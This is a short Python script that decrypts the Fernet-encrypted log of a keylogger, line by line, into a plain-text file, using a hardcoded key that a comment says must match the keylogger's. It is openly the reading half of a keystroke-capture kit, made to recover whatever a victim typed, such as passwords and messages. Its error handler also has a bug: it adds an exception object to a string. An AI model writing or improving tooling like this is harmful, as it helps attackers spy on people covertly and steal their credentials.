from cryptography.fernet import Fernet

#THIS KEY MUST BE THE SAME AS IN THE KEYLOGGER 
key = "3F5_MIT38NjguwKLSztfCdeoOYPOMi3NKK0rEGCrlSg="
#FILE TO DECRYPT
logfile = "log.txt"
#READABLE FILE
newfile = "decrypted.txt"

f = Fernet(key)
a = open(newfile, "a")

for i in open(logfile, "rb"):

    try:
        x = f.decrypt(i)
        message = x.decode()
        a.write(message)
        a.write("\n")
        print("Correct decrypt")
    except Exception as e:
        print("Error: " + e)
        
a.close()
